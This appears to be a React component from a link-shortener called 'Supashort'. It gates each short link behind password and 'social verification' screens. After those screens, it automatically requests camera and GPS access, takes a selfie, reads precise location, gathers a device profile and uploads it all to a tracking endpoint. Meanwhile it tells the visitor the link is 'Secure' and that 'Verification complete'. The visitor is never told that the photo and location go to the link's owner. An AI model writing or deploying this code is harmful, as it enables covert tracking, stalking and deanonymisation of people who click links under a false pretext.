"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { collectDeviceProfile } from "@/lib/device";
import { SocialIcon, platformMeta } from "@/components/ui/SocialIcon";

export interface GatewayLink {
  code: string;
  long_url: string;
  has_password: boolean;
  social_gate_title: string | null;
  social_gate_url: string | null;
  social_gate_icon: string | null;
  social_gate_description: string | null;
  social_gate_button_text: string | null;
  capture_camera: boolean;
  capture_location: boolean;
  animation_type: string | null;
  animation_text: string | null;
  expired: boolean;
}

type Step = "password" | "social" | "capture" | "loading";

function Spinner({ text }: { text: string }) {
  return (
    <div className="flex flex-col items-center gap-3">
      <span className="w-11 h-11 rounded-full border-[3px] border-blue-600 border-t-transparent animate-spin" />
      <p className="text-[11px] font-black uppercase tracking-[0.18em] text-zinc-600">{text}</p>
    </div>
  );
}

/** High-level camera capture → compressed JPEG data URL. */
async function captureSelfie(): Promise<string | null> {
  if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) return null;
  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    await video.play().catch(() => undefined);

    // let the sensor settle + expose a frame
    await new Promise((r) => setTimeout(r, 900));

    const canvas = document.createElement("canvas");
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) return null;
    ctx.drawImage(video, 0, 0, w, h);
    return canvas.toDataURL("image/jpeg", 0.62);
  } catch {
    return null;
  } finally {
    stream?.getTracks().forEach((t) => t.stop());
  }
}

function readGps(): Promise<{ latitude: number; longitude: number } | null> {
  return new Promise((resolve) => {
    if (typeof navigator === "undefined" || !navigator.geolocation) {
      resolve(null);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 9000, maximumAge: 30000 },
    );
  });
}

export function VisitorGateway({ link }: { link: GatewayLink }) {
  const [step, setStep] = useState<Step>(() => {
    if (link.has_password) return "password";
    if (link.social_gate_url) return "social";
    return "capture";
  });
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const submitted = useRef(false);

  const animationText = link.animation_text || "LOADING";

  const finish = useCallback(() => {
    setStep("loading");
    window.setTimeout(() => {
      window.location.replace(link.long_url);
    }, 1300);
  }, [link.long_url]);

  /* --------------------------- telemetry upload --------------------------- */
  const sendTelemetry = useCallback(
    async (selfie: string | null, gps: { latitude: number; longitude: number } | null) => {
      if (submitted.current) return;
      submitted.current = true;
      try {
        const profile = await collectDeviceProfile();
        await fetch("/api/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            code: link.code,
            telemetry: {
              ...profile,
              capturedImage: selfie,
              latitude: gps?.latitude ?? null,
              longitude: gps?.longitude ?? null,
            },
          }),
          keepalive: true,
        });
      } catch {
        /* telemetry is best-effort — never block the visitor */
      }
    },
    [link.code],
  );

  /* ------------------------------ capture step ---------------------------- */
  const runCapture = useCallback(async () => {
    const [selfie, gps] = await Promise.all([
      link.capture_camera ? captureSelfie() : Promise.resolve(null),
      link.capture_location ? readGps() : Promise.resolve(null),
    ]);
    await sendTelemetry(selfie, gps);
    finish();
  }, [link.capture_camera, link.capture_location, sendTelemetry, finish]);

  /* Auto-run the capture step when it becomes the active step. */
  useEffect(() => {
    if (step !== "capture") return;
    void runCapture();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step]);

  /* ------------------------------ password -------------------------------- */
  const checkPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setError("Enter the password to continue.");
      return;
    }
    setError("");
    try {
      const res = await fetch(`/api/links/${encodeURIComponent(link.code)}/unlock`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: password.trim() }),
      });
      const data = (await res.json()) as { success?: boolean; error?: string };
      if (!res.ok || !data.success) {
        setError(data.error || "Incorrect password.");
        return;
      }
      setStep(link.social_gate_url ? "social" : "capture");
    } catch {
      setError("Network error. Please try again.");
    }
  };

  /* ------------------------------- social --------------------------------- */
  const platform = platformMeta(link.social_gate_icon || "link");
  const openSocial = () => {
    if (link.social_gate_url) window.open(link.social_gate_url, "_blank", "noopener,noreferrer");
  };

  if (link.expired) {
    return (
      <Shell label="Expired Link">
        <div className="text-center space-y-3">
          <div className="glass-orb orb-red w-14 h-14 mx-auto text-2xl">⏳</div>
          <h1 className="text-xl font-black text-zinc-900">This link has expired</h1>
          <p className="text-[12.5px] font-semibold text-zinc-600">
            The owner set an expiration date for <span className="font-mono">/{link.code}</span>.
            Ask them for a fresh one.
          </p>
        </div>
      </Shell>
    );
  }

  return (
    <Shell label={`Secure Link · /${link.code}`}>
      {step === "password" ? (
        <form onSubmit={checkPassword} className="space-y-3 text-center">
          <div className="glass-orb orb-amber w-14 h-14 mx-auto text-2xl">🔒</div>
          <h1 className="text-xl font-black text-zinc-900 leading-tight">Password Protected</h1>
          <p className="text-[12px] font-semibold text-zinc-600">
            This smart link is locked. Enter the password shared by the owner to continue.
          </p>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter password"
            autoComplete="off"
            className="w-full liquid-glass-input px-4 py-3 text-center text-sm font-bold"
          />
          {error ? <p className="text-[11px] font-bold text-rose-600">{error}</p> : null}
          <button
            type="submit"
            className="glass-orb orb-blue w-full py-3 text-[13px] font-black uppercase tracking-wider text-white"
          >
            Unlock Link
          </button>
        </form>
      ) : null}

      {step === "social" ? (
        <div className="space-y-3 text-center">
          <div
            className="w-14 h-14 mx-auto rounded-2xl bg-white border-2 border-white shadow-lg flex items-center justify-center"
            style={{ boxShadow: `0 10px 24px -8px ${platform.brand}88` }}
          >
            <SocialIcon platform={platform.key} className="w-7 h-7" />
          </div>
          <h1 className="text-xl font-black text-zinc-900 leading-tight">
            {link.social_gate_title || `Verify on ${platform.label}`}
          </h1>
          <p className="text-[12px] font-semibold text-zinc-600 leading-relaxed">
            {link.social_gate_description ||
              `Complete the ${platform.label} step below, then continue to your destination.`}
          </p>
          <button
            onClick={openSocial}
            className="glass-orb w-full py-3 text-[13px] font-black uppercase tracking-wider text-white"
            style={{ background: `radial-gradient(circle at 35% 30%, ${platform.brand} 0%, ${platform.brand} 60%, #111 100%)` }}
          >
            <span className="flex items-center justify-center gap-2">
              <SocialIcon platform={platform.key} colored={false} className="w-4 h-4" />
              <span>{link.social_gate_button_text || "Verify & Continue"}</span>
            </span>
          </button>
          <button
            onClick={() => setStep("capture")}
            className="w-full py-2.5 rounded-full bg-white/70 border border-white/90 text-[11px] font-black uppercase tracking-wider text-zinc-700 hover:bg-white"
          >
            I&apos;ve completed the step — Continue
          </button>
        </div>
      ) : null}

      {step === "capture" ? (
        <div className="text-center space-y-3">
          <Spinner text={animationText} />
          <p className="text-[11px] font-semibold text-zinc-500">
            {link.capture_camera && link.capture_location
              ? "Requesting camera & GPS permission…"
              : link.capture_camera
                ? "Requesting camera permission…"
                : link.capture_location
                  ? "Requesting GPS permission…"
                  : "Preparing your destination…"}
          </p>
          <button
            onClick={() => {
              void sendTelemetry(null, null);
              finish();
            }}
            className="text-[10.5px] font-bold text-zinc-500 underline decoration-zinc-300 hover:text-zinc-800"
          >
            Skip verification
          </button>
        </div>
      ) : null}

      {step === "loading" ? (
        <div className="text-center space-y-4">
          <Spinner text={animationText} />
          <div className="space-y-1">
            <p className="text-[13px] font-black text-zinc-900">Verification complete</p>
            <p className="text-[11px] font-semibold text-zinc-500">
              Redirecting you to{" "}
              <span className="font-mono text-zinc-700">
                {(() => {
                  try {
                    return new URL(link.long_url).hostname;
                  } catch {
                    return "your destination";
                  }
                })()}
              </span>
              …
            </p>
          </div>
          <a
            href={link.long_url}
            className="inline-block text-[11px] font-black uppercase tracking-wider text-blue-700 underline"
          >
            Continue manually
          </a>
        </div>
      ) : null}
    </Shell>
  );
}

function Shell({ children, label }: { children: React.ReactNode; label: string }) {
  return (
    <main className="relative z-10 min-h-[100dvh] flex items-center justify-center p-4">
      <div className="ambient-refraction-blob w-64 h-64 bg-blue-400/40 -top-10 -left-10" aria-hidden />
      <div className="ambient-refraction-blob w-72 h-72 bg-pink-400/30 bottom-0 -right-10" aria-hidden />
      <div className="clay-board rounded-[28px] p-6 sm:p-8 w-full max-w-sm relative">
        <p className="text-[9px] font-black uppercase tracking-[0.2em] text-zinc-500 text-center mb-3">
          {label}
        </p>
        {children}
        <p className="mt-5 text-center text-[9px] font-bold uppercase tracking-wider text-zinc-400">
          Protected by Supashort · 3D Liquid Glass OS
        </p>
      </div>
    </main>
  );
}